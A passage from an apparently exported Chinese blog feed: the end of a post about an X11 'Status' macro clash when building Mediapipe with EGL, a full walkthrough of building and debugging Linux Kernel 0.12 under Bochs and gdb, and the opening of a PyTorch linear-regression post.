#ifndef __eglplatform_h_
#define __eglplatform_h_

/*
** Copyright (c) 2007-2016 The Khronos Group Inc.
**
** Permission is hereby granted, free of charge, to any person obtaining a
** copy of this software and/or associated documentation files (the
** "Materials"), to deal in the Materials without restriction, including
** without limitation the rights to use, copy, modify, merge, publish,
** distribute, sublicense, and/or sell copies of the Materials, and to
** permit persons to whom the Materials are furnished to do so, subject to
** the following conditions:
**
** The above copyright notice and this permission notice shall be included
** in all copies or substantial portions of the Materials.
**
** THE MATERIALS ARE PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
** EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
** MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
** CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
** TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** MATERIALS OR THE USE OR OTHER DEALINGS IN THE MATERIALS.
*/

/* Platform-specific types and definitions for egl.h
 * $Revision: 30994 $ on $Date: 2015-04-30 13:36:48 -0700 (Thu, 30 Apr 2015) $
 *
 * Adopters may modify khrplatform.h and this file to suit their platform.
 * You are encouraged to submit all modifications to the Khronos group so that
 * they can be included in future versions of this file.  Please submit changes
 * by sending them to the public Khronos Bugzilla (http://khronos.org/bugzilla)
 * by filing a bug against product "EGL" component "Registry".
 */

#include &lt;KHR/khrplatform.h>

/* Macros used in EGL function prototype declarations.
 *
 * EGL functions should be prototyped as:
 *
 * EGLAPI return-type EGLAPIENTRY eglFunction(arguments);
 * typedef return-type (EXPAPIENTRYP PFNEGLFUNCTIONPROC) (arguments);
 *
 * KHRONOS_APICALL and KHRONOS_APIENTRY are defined in KHR/khrplatform.h
 */

#ifndef EGLAPI
#define EGLAPI KHRONOS_APICALL
#endif

#ifndef EGLAPIENTRY
#define EGLAPIENTRY  KHRONOS_APIENTRY
#endif
#define EGLAPIENTRYP EGLAPIENTRY*

#if defined(MESA_EGL_NO_X11_HEADERS) &amp;&amp; !defined(EGL_NO_X11)
#warning "`MESA_EGL_NO_X11_HEADERS` is deprecated, and doesn't work with the unmodified Khronos header"
#warning "Please use `EGL_NO_X11` instead, as `MESA_EGL_NO_X11_HEADERS` will be removed soon"
#define EGL_NO_X11
#endif

/* The types NativeDisplayType, NativeWindowType, and NativePixmapType
 * are aliases of window-system-dependent types, such as X Display * or
 * Windows Device Context. They must be defined in platform-specific
 * code below. The EGL-prefixed versions of Native*Type are the same
 * types, renamed in EGL 1.3 so all types in the API start with "EGL".
 *
 * Khronos STRONGLY RECOMMENDS that you use the default definitions
 * provided below, since these changes affect both binary and source
 * portability of applications using EGL running on different EGL
 * implementations.
 */

#if defined(_WIN32) || defined(__VC32__) &amp;&amp; !defined(__CYGWIN__) &amp;&amp; !defined(__SCITECH_SNAP__) /* Win32 and WinCE */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN 1
#endif
#include &lt;windows.h>

typedef HDC     EGLNativeDisplayType;
typedef HBITMAP EGLNativePixmapType;
typedef HWND    EGLNativeWindowType;

#elif defined(__EMSCRIPTEN__)

typedef int EGLNativeDisplayType;
typedef int EGLNativePixmapType;
typedef int EGLNativeWindowType;

#elif defined(__WINSCW__) || defined(__SYMBIAN32__)  /* Symbian */

typedef int   EGLNativeDisplayType;
typedef void *EGLNativePixmapType;
typedef void *EGLNativeWindowType;

#elif defined(WL_EGL_PLATFORM)

typedef struct wl_display     *EGLNativeDisplayType;
typedef struct wl_egl_pixmap  *EGLNativePixmapType;
typedef struct wl_egl_window  *EGLNativeWindowType;

#elif defined(__GBM__)

typedef struct gbm_device  *EGLNativeDisplayType;
typedef struct gbm_bo      *EGLNativePixmapType;
typedef void               *EGLNativeWindowType;

#elif defined(__ANDROID__) || defined(ANDROID)

struct ANativeWindow;
struct egl_native_pixmap_t;

typedef void*                           EGLNativeDisplayType;
typedef struct egl_native_pixmap_t*     EGLNativePixmapType;
typedef struct ANativeWindow*           EGLNativeWindowType;

#elif defined(USE_OZONE)

typedef intptr_t EGLNativeDisplayType;
typedef intptr_t EGLNativePixmapType;
typedef intptr_t EGLNativeWindowType;

#elif defined(__unix__) &amp;&amp; defined(EGL_NO_X11)

typedef void             *EGLNativeDisplayType;
typedef khronos_uintptr_t EGLNativePixmapType;
typedef khronos_uintptr_t EGLNativeWindowType;

#elif defined(__unix__) || defined(USE_X11)

/* X11 (tentative)  */
#include &lt;X11/Xlib.h>
#include &lt;X11/Xutil.h>

typedef Display *EGLNativeDisplayType;
typedef Pixmap   EGLNativePixmapType;
typedef Window   EGLNativeWindowType;

#elif defined(__APPLE__)

typedef int   EGLNativeDisplayType;
typedef void *EGLNativePixmapType;
typedef void *EGLNativeWindowType;

#elif defined(__HAIKU__)

#include &lt;kernel/image.h>

typedef void              *EGLNativeDisplayType;
typedef khronos_uintptr_t  EGLNativePixmapType;
typedef khronos_uintptr_t  EGLNativeWindowType;

#else
#error "Platform not recognized"
#endif

/* EGL 1.2 types, renamed for consistency in EGL 1.3 */
typedef EGLNativeDisplayType NativeDisplayType;
typedef EGLNativePixmapType  NativePixmapType;
typedef EGLNativeWindowType  NativeWindowType;


/* Define EGLint. This must be a signed integral type large enough to contain
 * all legal attribute names and values passed into and out of EGL, whether
 * their type is boolean, bitmask, enumerant (symbolic constant), integer,
 * handle, or other.  While in general a 32-bit integer will suffice, if
 * handles are 64 bit types, then EGLint should be defined as a signed 64-bit
 * integer type.
 */
typedef khronos_int32_t EGLint;


/* C++ / C typecast macros for special EGL handle values */
#if defined(__cplusplus)
#define EGL_CAST(type, value) (static_cast&lt;type>(value))
#else
#define EGL_CAST(type, value) ((type) (value))
#endif

#endif /* __eglplatform_h */

这文件被删改的谁都不认识了好吧！！！你说气不气，关键是Mediapipe编译GPU 版本的时候，还得用到这个EGL_NO_X11宏。我真的是无fuck说。
出现问题的根源是：
/*
  In file EGL/egl.h: #include &lt;EGL/eglplatform.h>

  In file EGL/eglplatform.h: #include &lt;X11/Xlib.h>

  In file X11/Xlib.h(line:83): #define Status int

  当我们include 了 egl.h 这个文件后，会引入一个Status的宏。

  在我们使用google的工程的时候，还有一个class 叫做 absl::Status。

  如果项目中定义一个变量：
  absl::Status TestVal;

  会被预编译为:
  absl::int TestVal;
  
  然后就会编译报错。
*/




后记

  好了，这就是我初探Mediapipe的故事。初次接触的话，我觉得最恼火的还是它的编译问题（对我来说：bazel是真的难用），其实编译问题解决了，还是很友好的，这些代码都封装的很好。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>嵌入式</category>
        <category>DL</category>
      </categories>
      <tags>
        <tag>CPP</tag>
        <tag>深度学习</tag>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 0.12 启动简介，调试记录(Ubuntu1804, Bochs, gdb)</title>
    <url>/2021/03/07/blog_idx_102/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 18.04


gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)


Bochs 2.6


As86 version: 0.16.17


前言

  自从我近段时间开始温习一些基础知识以来，其中觉得以前学的很浅的就是OS原理。为啥这样说呢？因为就是浅，知道一些琐碎的知识。以前我自负的认为OS就是硬件的抽象，然后把这些硬件资源合理的分配给用户使用就完了，因为我觉得合理的整合这些硬件资源是非常‘简单’的。
  由于我本身对底层是非常着迷的。带着觉得OS很简单的想法，想着去看看LinuxKernel的源码。在以前，我对LinuxKernel的认知很肤浅，就知道一些驱动移植的事情。如果硬要说一件我在LinuxKernel中玩的很深的事情，那就是自己理解并实现了一个类似Anonymous Shared Memory的Linux驱动，详见以下两篇文章。


《Android匿名共享内存(Anonymous Shared Memory) — 瞎折腾记录 (驱动程序篇)》 https://blog.csdn.net/u011728480/article/details/88420467


《linux kernel 中进程间描述符的传递方法及原理》 https://blog.csdn.net/u011728480/article/details/88553602


  带着这样的想法其实已经很久了，由于现在的LinuxKernel太大了，对新手不友好。我就想着去找一个老一点的版本内核看看。结果去网上一找，就发现了前人已经做了许多许多了，比如这个之前就有了解的《linux 0.11内核完全注释》，还比如其他许许多多前人种的‘树’，看到了许多，最终我决定跟着国内现在比较好和新的资料从‘远古’开始学习它。它就是《Linux内核完全注释(PDF) v5.0 by 赵炯.pdf》。它是基于LinuxKernel0.12 讲述的，它是我在ubuntu1804上编译通过LinuxKernel0.12的主要参考和学习资料，同时也是我在Bochs上运行成功的主要参考和学习资料。
  好的多说无益，直接看运行效果。

    
        
    
    
  说来也惭愧，利用断断续续的时间，我花了约2月，把LinuxKernel0.12在Ubuntu1804上编译通过，并在1804上通过Bochs运行成功。而且要命的事情是我其实只加了一些打印调试函数，和根据实际的调试情况修改了一些代码，却花了那么久的时间，搞得我很不自信了QAQ。
  我修改好的源码已经开源，立即想要源码的请直接去文末两个rep clone即可。
  本文主要还是简单介绍LinuxKernel从上电到进入sh的中间的简要流程。这些流程网上已经有很多了，可能我会挑选一些我觉得比较重要的来说。
  本文适用于：


会编译和使用bochs的人。不会可以去网上找找，很多这方面的资料。


对Intel AT&amp;T 汇编有点了解的人。


会GDB调试的人。


知道C语言常识的人。


对LinuxKernel感兴趣的人。






搭环境

  工欲善其事必先利其器。本文主要是在Ubuntu1804上编译生成LinuxKernel，然后用Bochs运行我们的内核。


Ubuntu18.04环境安装
我们应该首先安装make,gcc,gcc-multilib,bin86。


sudo apt install build-essential cmake make gcc-multilib g+±multilib module-assistant bin86


然后进入源码目录。


cd my_src


make disk


更多的详情信息查看开源的rep。


编译两个bochs版本备用
  我们首先就得把Linux0.12的运行环境搭建起来，方便我们调试。我们使用的是Bochs2.6 和 GDB远程调试。并编译出两个bochs版本，一个是带本身调试功能（命名为：bochs），一个是和gdb联调（命名为：bochsdbg）。bochs 主要是调试在init/main()函数之前的内容以及查看更多的x86寄存器。 bochsdbg主要是调试进入init/main()函数之后到sh成功执行的事情。


通过 ./configure  --enable-debugger 生成bochs。


通过 ./configure  --enable-gdb-stub 生成bochsdbg。




运行我们编译的内核
  通过本文介绍生成的文件是Linux内核镜像，稍微懂点行的人都知道还差一个RootFS。这个文件系统我们在网上下载的例如： http://oldlinux.org/Linux.old/bochs/linux-0.12-080324.zip 。本文生成的Linux内核镜像使用的是rootimage-0.12-hd这个文件系统。
  我建议这里自己配置两个.bxrc文件，一个对应bochs，一个对应bochsdbg远程调试。这样在遇到问题的时候我们可以很方便的调试。




LinuxKernel启动简介

  本节简述LinuxKernel的启动流程。根据我近段时间的学习来看，这里包含了许多的历史性的东西，大家不要去细究为啥是这样，很多都是为了兼容。
  此外在整个学习期间，由于涉及到许多的x86 硬件体系知识，除了参考上文我说的文档以外，还必须参考以下Intel官方文档：


Intel® 64 and IA-32 architectures software developer’s manual combined volumes 2A, 2B, 2C, and 2D:Instruction set reference, A-Z


Intel® 64 and IA-32 architectures software developer’s manual combined volumes 3A,
3B, 3C, and 3D: System programming guide


《Linux内核完全注释(PDF) v5.0 by 赵炯.pdf》 第4章，全篇精华。




boot/bootsect.S 阶段
  当我们的计算机上电以后，IntelCPU进入实模式，并且PC指向了0xfff0整个地址，如下图。什么意思呢？就是开机的时候执行的第一句指令放在0xffff0这个地方，通常这里有一个很重要的东西叫做BIOS。我们可以看到下图，cs=0xf000,base=0xffff0000,在实模式下面，cs:pc 就是真实的指向地址0xffff0。到了这里不知道大家发现没有，这里还差一个东西，那就是bios本来是放在rom里面的，怎么被指向了内存地址0xffff0的地方呢？是谁在之前自动搬运的吗？经过查询后发现，大部分人说开机的时候，对特殊地址的访问会被仲裁器件指向BIOS-ROM器件。仲裁器还可以把地址翻译并指向我们熟悉的MEM和IO。所以这里我理解对0xffff0的访问就是对BIOS-ROM器件的直接访问和执行。

    
        
    
    
  BIOS主要是做自检，并且在物理地址0x0开始初始化BIOS的中断向量，同时通过BIOS访问存储设备的中断，将可启动设备的第一个扇区512字节给搬运到绝对地址0x7c00(31k)处。然后跳转到0x7c00继续执行，这里被搬运的512字节就是bootsect.S生成的指令。这一段没啥营养，都是一些约定好的，到了CPU执行到绝对地址0x7c00的时候，才是真正的我们能控制的地方。其实这里也能够看到，我们的bootsect.S生成的指令最大只能够512字节，超过了就会出问题。下图为我们的0x7c00处的开始几句指令和bootsect.S的几句指令,同时也能够看到BIOS初始化和自检打印的一些内容：

    
        
    
   
&emsp;&emsp;在上图的图中，我打印了0x7c00开始的一部分反汇编代码。可以看到和下面的bootsect.S的代码是一致的。
entry start
start:
! start at 0x07c0:0
! add by sky
	mov ax,#BOOTSEG
	mov es,ax
	mov	bp,#msg2	  ! sky-notes: src-str is es:bp
	mov	si,#15        ! sky-notes: src-str-len is cx
	call pirnt_str
! add by sky

	mov	ax,#BOOTSEG
	mov	ds,ax
	mov	ax,#INITSEG
	mov	es,ax
	mov	cx,#256
	sub	si,si
	sub	di,di
	rep
	movw
	jmpi	go,INITSEG
  从0x7c00开始，就是我们自己的可以编程的领域了，也开始有了一些我自己特有的内容。主要是各种方法实现的print语句。这种调试方法简直不要太好。
  下面简要说明一下bootsect.S的功能：


首先用rep movw把自己从0x7c00搬运到0x90000，并跳转cs=0x9000, pc=go 标号的地址。继续执行剩下的内容。


通过读取0x1E号中断向量位置的软驱参数（由BIOS初始化时候通过BIOS中断读取的）到内存，然后修改其中的最大扇区数，并重新写回到0x1E中断向量位置绝对地址0x78去。最后重置软驱，使其加载最新的参数。


使用BIOS INT 0x13的2号功能，将第一个软盘第2，3，4，5扇区读取到0x90200开始的位置。这里读取的就是setup.S的指令内容，最大共2k（4*512）。0x90000-0x90200存放的是bootsect.S， 0x90200-0x90A00 为setup.S。


使用BIOS INT 0x13的8号功能，读取磁盘参数：每磁道扇区数。并保存到变量sectors中。


使用BIOS INT 0x13的2号功能，使用刚刚的参数，读取system模块到0x10000，我们的bootsect.S放在0x90000,所以我们system模块最大只能够占用0x10000~0x8ffff。这里的system模块就是除了bootsect和setup模块之外的所有内核代码。


判断bootsect模块第508，509字节是否为0，来判断我们是否指定根文件系统的设备号。我们的内核定义为0x0301，代表第一个磁盘第一个分区为我们的根文件系统。


然后通过jmpi 0:9020跳转到cs=0x9020，pc=0的地方去执行setup.S的代码。


  在我的bootsect模块，我定义了一个打印字符串的函数，主要是通过使用BIOS INT 0x10的0x13号功能实现。主要还是为了调试，注意，这里不能够随意添加代码，因为生成的代码超过512byte后，链接器会报错。只能够少量的添加我们的调试代码。
  至此，我们就执行完了bootsect模块。本模块的主要内容还是加载setup和system到指定位置。bootsect执行的一些调试日志如下图（在0x90200下断点）：

    
        
    
   
注意：图中话框的部分就是我们上文贴出的call pirnt_str打印的。


boot/setup.S 阶段
  首先我们还是来看一下0x90200的位置是否是setup.S，换句话来说是否加载好了setup模块。

    
        
    
   
&emsp;&emsp;这里和bootsect一样，我也弄了一个prtstr函数，这个prtstr和bootsect里面的是一样的，原理也是一致的。
  刚刚我们提到，setup是从0x90200开始存放的。那么0x90000~0x901ff中的bootsect已经无用了，于是我们setup中，用这里的内存存放一些参数。下面简要说明一下setup.S的功能：


用BIOS INT 0x15功能号0x88取系统所含扩展内存大小并保存在内存0x90002~0x90003处。共两个字节。


用BIOS INT 0x10功能号0x12读取显卡参数，0x9000A 显存大小，0x9000B 显卡类型（单色/彩色）,0x9000C显卡特性参数。


用BIOS中断读取屏幕的行列存放到0x9000E 0x9000F


用BIOS INT 0x10功能号0x03读取当前光标位置存放到0x90000 0x90001


用BIOS INT 0x10功能号0x0f读取当前显示页，显示模式，字符列数。 0x90004~0x90005 存放当前显示页。 0x90006 显示模式， 0x90007 字符列数。


读取第一个硬盘参数表和第二个硬盘参数表，并放到0x90080 0x90090。每个表共16byte。注意，这里和之前的软盘参数一样，在BIOS自检过程中，就被放到了中断向量0x41 0x46 的位置。


用BIOS INT 0x13功能号0x15读取当前硬盘设备情况，如果硬盘2不存在，则把0x90090之后的16byte清零。


  下面我们将使CPU从实模式变更为保护模式，下面继续说明一下setup.S的功能：


禁用中断。


然后我们把system模块0x10000~0x8ffff整体下移到0x0开始的位置。就是把最大0x80000(512k)的system模块向下移动0x10000(64k)。


首先加载LDT和GDT。


开启A20地址线，支持1M以上的内存。


初始化两个8259A中断控制器。


通过lmsw 设置cr0最低位位1，进入保护模式。


通过jmpi 0:0x8跳转到绝对地址0x0开始执行system的代码。system是从boot/head.s开始的。


  这里需要说明几个事情：


我们在下移system模块的时候，覆盖了BIOS中断向量表。所以通过BIOS中断打印字符串是行不通的。


在实模式中，cs:pc就是真实执行的地址。但是在保护模式中，cs是一个选择符号，根据选择符号值不同，分表在GDT或者LDT中查找对应的CS段描述符，其中最重要的就是base地址，当未开启分页的时候，这里的base+pc就是我们真实的执行地址。上面我们加载了LDT和GDT。这里的LDT是空，GDT有3项，第零项是空，第一项是代码段描述符，第二项是数据段描述符，他们的基地址都是0x0。当cs=0x08,ds=0x10时，分别指向这里的第一项和第二项。


  刚刚说了，system下移导致BIOS中断向量表被冲掉了，于是我们不能够通过BIOS打印字符串，于是这里我们使用的是直接操作显存内存地址显示字符，这个原理和LinuxKernel tty显示原理差别不是很大。
  这里我们设计了print_str函数，通过直接操控显存然后写入字符进行显示，这里还使用到了刚刚我们保存的当前光标位置（0x90000 0x90001）。写这个主要还是为了调试。
  到此，我们已经开始去执行system的内容，其中head.s是入口。下图是在0x0下断点得到的setup模块的一些打印日志。

    
        
    
   
&emsp;&emsp;这里我们可以看到，红框还是BIOS中断打印的，黄框是通过直接操纵显存显示的。注意，我这里设计的直接操作显存的函数，是通过循环在当前显存页显示的，并不是我们常见的整页上移的方式。


boot/head.s 阶段
  首先我们还是来看一下0x0的位置是否是head.s，换句话来说是否加载好了system模块。并且，从这里开始，我们就是进入了真正的LinuxKernel的世界，前面都是做一些环境初始化，都是一些固定的内容。

    
        
    
   
  这里我们需要说明的是，bootsect.S和setup.S用的是intel汇编，而从head.s开始，我们用的都是AT&amp;T汇编。同理，这里我也弄了一个safe_mode_print_str_no_page，打印字符串，为了调试，还是用的直接操作显存的方式。
  从这里开始，CPU开始工作于保护模式，下面简要介绍一下工作流程：


刚刚我们通过jmpi切换到0x0开始执行，这时cs=0x8,根据setup设置好的GDT，base为0x0，同理我们设置其他段寄存器。


设置堆栈为stack_start，这个就是内核堆栈。此符号定义于kernel/sched.c中，如下文。


long user_stack [ PAGE_SIZE>>2 ] ;

struct &#123;
	long * a;
	short b;
	// &#125; stack_start = &#123; &amp; user_stack [PAGE_SIZE>>2] , 0x10 &#125;;
	&#125; stack_start = &#123; &amp; user_stack , 0x10 &#125;;


设置IDT，所有的中断向量指向ignore_int，一个预定义的中断服务程序。共256项，每项8byte。


重新设置GDT。共256项，每项8byte。重新设置GDT的原因是setup的GDT可能会被冲掉，于是把GDT设置到合理的内存位置。这里设置好的GDT有4个。和setup中类似。第0，3个为0.第1，2项为cs和ds的段描述符。


检查A20是否开通，主要是通过判断0x100000 和 0x0值是否相等。


检查数学协处理器是否存在。


  到这里，我们就开始准备正式进入到init/main.c中的main函数了，但是还差最后一个重要的事情，那就是启用分页机制，下面继续介绍其工作流程：
after_page_tables:
	# sky print
	push %ebp
	lea msg5, %ebp
	call safe_mode_print_str_no_page
	pop %ebp	
	#
	pushl $0		# These are the parameters to main :-)
	pushl $0
	pushl $0
	pushl $L6		# return address for main, if it decides to.
	pushl $main
	jmp setup_paging


从上面的代码我们可只，我们在启用分页前，把init/main.c中的main函数地址设置到了堆栈中。


首先我们把从0x0开始的5页内存清零。每页4096字节。其中第一页为页表目录，第2-5页为页表。


设置页表目录的前4项为第2-5页页表地址。注意页表目录为1024项，每项4字节。


倒序设置每一个页表的每一项内容，第5页最后一项为0xfff000。映射之后，2-5页分别映射好了16MB内存的空间。


操作cr0，开启分页


通过ret指令，从堆栈中把main地址弹出去执行。


  到这里，我们正式进入到init/main.c中的main函数中，进入c语言相关代码的地界。下面是进入main之前的一些日志输出。

    
        
    
   


init/main.c 到进入shell
  这里我们进入了init/main.c中的main函数，可从下图看到。从这里开始，也是我们大家都熟知的Linux内核部分。

    
        
    
   
void main(void)		/* This really IS void, no error here. */
&#123;			/* The startup routine assumes (well, ...) this */
/*
 * Interrupts are still disabled. Do necessary setups, then
 * enable them
 */
	char _my_msg_buf[100];
	sprintf(_my_msg_buf, "kernel main() start, root_dev=%x, swap_dev=%x ... ...\0", ORIG_ROOT_DEV, ORIG_SWAP_DEV);
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);



 	ROOT_DEV = ORIG_ROOT_DEV;
 	SWAP_DEV = ORIG_SWAP_DEV;

	sprintf(term, "TERM=con%dx%d", CON_COLS, CON_ROWS);

	envp[1] = term;	
	envp_rc[1] = term;
 	drive_info = DRIVE_INFO;

	memory_end = (1&lt;&lt;20) + (EXT_MEM_K&lt;&lt;10);
	memory_end &amp;= 0xfffff000;//align 4k



	if (memory_end > 16*1024*1024)//if memory_end > 16MB, set it to be 16 MB
		memory_end = 16*1024*1024;

	if (memory_end > 12*1024*1024) 
		buffer_memory_end = 4*1024*1024;
	else if (memory_end > 6*1024*1024)
		buffer_memory_end = 2*1024*1024;
	else
		buffer_memory_end = 1*1024*1024;

	main_memory_start = buffer_memory_end;

	sprintf(_my_msg_buf, "Mem size is %x, buf-mem size is %x, main-mem start %x ... ...\0", memory_end, main_memory_start, buffer_memory_end);
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);


#ifdef RAMDISK
	sprintf(_my_msg_buf, "ramdisk init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	main_memory_start += rd_init(main_memory_start, RAMDISK*1024);
#endif

	sprintf(_my_msg_buf, "memory init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	mem_init(main_memory_start,memory_end);

	sprintf(_my_msg_buf, "trap init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	trap_init();

	sprintf(_my_msg_buf, "blk init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	blk_dev_init();

	sprintf(_my_msg_buf, "chr init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	chr_dev_init();

	sprintf(_my_msg_buf, "tty init ... ...\0");
	__asm__ (
	"push %%ebp\n\t"
	"mov %0, %%ebp\n\t"
	"call safe_mode_print_str_after_page\n\t" 
	"pop %%ebp\n\t"
	:
	:"p"((char *)&amp;_my_msg_buf)
	:);
	tty_init();

	printk("time init ... ...\n\r");
	time_init();

	printk("sched init ... ...\n\r");
	sched_init();
	/*
	After sched_init()

	gdt[0] = NULL
	gdt[1] = kernel cs
	gdt[2] = kernel ds
	gdt[3] = NULL
	
	gdt[4] = task0.tss
	gdt[5] = task0.ldt

	tr=task0.tss
	ldtr=task0.ldt
	*/

	printk("buffer init ... ...\n\r");
	buffer_init(buffer_memory_end);

	printk("hd init ... ...\n\r");
	hd_init();

	printk("floppy init ... ...\n\r");
	floppy_init();

	printk("enable interrupts ... ...\n\r");
	sti();

	printk("go to user mode ... ...\n\r");
	/*
	movl %%esp,%%eax
	pushl $0x17
	pushl %%eax
	pushfl
	pushl $0x0f
	pushl $1f
	iret
	1:
	movl $0x17,%%eax
	mov %%ax,%%ds
	mov %%ax,%%es
	mov %%ax,%%fs
	mov %%ax,%%gs

	iret instruction will do follow op:
	popl eip
	popl cs
	popl eflag
	popl esp
	popl ss
	*/
	move_to_user_mode();

	printf("user_mode: fork() task0 ... ...");
	if (!fork()) &#123;		/* we count on this going ok */

		printf("user_mode: task1 call init ... ...");
		init();
	&#125;
/*
 *   NOTE!!   For any other task 'pause()' would mean we have to get a
 * signal to awaken, but task0 is the sole exception (see 'schedule()')
 * as task 0 gets activated at every idle moment (when no other tasks
 * can run). For task0 'pause()' just means we go check if some other
 * task can run, and if not we return here.
 */
	printf("user_mode: task0 call sys_pause() in while ... ...");
	for(;;)
		__asm__("int $0x80"::"a" (__NR_pause):);
&#125;
  注意，这里我们仍然设计了一个函数为safe_mode_print_str_after_page，通过直接操作显存进行显示字符串，知道tty_init之后，我们才能够调用printk类似的函数进行打印。
  下面简要介绍一下main函数主要做的事情：


根据我们在setup中保存到内存中的内存参数初始化高速缓冲区和主存的位置。


然后就是我们常见的初始化mm模块。


初始化中断向量。


初始化块设备。


初始化字符串设备。


初始化tty设备。


初始化时间。


初始化调度模块。


初始化缓冲区。


初始化硬盘。


初始化软盘。


开启中断。


把当前任务切换到用户态。


  当我们切换到用户态之后，并且当前我们的进程是0号进程，我们内核的一些重要初始化基本设置完毕。然后就像我们常见的linux编程那样，通过fork，创建我们的1号进程。然后我们继续进行下面的事情：


task0在fork出task1之后，就循环调用sys_pause, 这里主要还是执行schedule()开始执行进程调度。


task1成功创建后，调用setup，开始加载根文件系统。然后task1 通过fork创建了task2。


task2通过execve开始运行/bin/sh，进入shell。后续就是一些其他的事情。


  到这里，我们已经把kernel跑起来了。在我调试的过程中，主要还是mm模块和schedule模块有些问题，可能和编译器版本有关系，反正我生成的代码，总会报错。哪怕到现在，我开源出来的我修改的内核，也非常的不稳定，经常崩溃。但是好在正常工作了。
  下面给出两种不同打印的日志：

    
        
    
   

    
        
    
   


tool/build.c
  此工具是生成LinuxKernel镜像的手段。但是我们在Ubuntu上生成的内核，由于gcc版本变更的原因，需要做一些变更。主要还是把生成的elf格式system模块通过objcopy 生成二进制内存镜像。主要原因就是elf格式需要一个elf加载器进行各个段的重定位，但是由于我们是内核，所以没有。详情，请查看tool/build.c 及 Makefile。




开源

  https://github.com/flyinskyin2013/LinuxKernel-src0.12
  https://gitee.com/sky-X/LinuxKernel-src0.12 （镜像）




后记

  为啥想要在ubuntu1804环境下弄这个东西呢？一方面是想学习一下，通过踩坑的方式加深自己的理解。另一方面还是太懒了，我只想在我的ubuntu1804上编译内核，不想安装其他虚拟机了，我的电脑太卡了（毕竟8年的电脑了QAQ）。
  经过了这一波调试，我对LinuxKernel有了更深的认知，我觉得很不错，如果以后有必要，我还可以分别对这些模块进行详细的查看，在这里，我只是简单的说明了init/main中的内容，其实，还有许多其他的内容是运行在背后的。比如system_call,sys_table等等内容。还有do_fork do_execve等等内容都是我在调试过程中踩过的坑。
  这里还是要说明，深入调试学习这个的原因还是想看看OS是怎么运行起来，虽然不能说已经100%的熟知，但是也可管中窥豹。
  注意，这个版本的内核和现代的2.0，4.0，5.0还缺了一些主要的知识，比如网络栈，VFS等。但是其他的一些内容，在现在的最新内核中，多多少少都能够看到这个版本的一些影子。这也是学习这个内核的原因之一。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(一)---线性回归及示例（Pytorch，平方损失）</title>
    <url>/2021/07/04/blog_idx_105/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  从我2017毕业到现在为止，我的工作一直都是AI在边缘端部署落地等相关内容。所以我的工作基本都集中在嵌入式+Linux+DL三者之内的范围，由于个人兴趣和一些工作安排，就会去做一些模型移植的工作，所以我会经常接触模型基本结构，前处理、后处理等等基本的知识，但是其实我很少去接触模型怎么来的这个问题。虽然以前也硬啃过Lenet5和BP算法，也按照别人弄好的脚本训练过一些简单的模型，但是从来没有认真仔细的看过这些脚本，这些脚本为什么这样写。
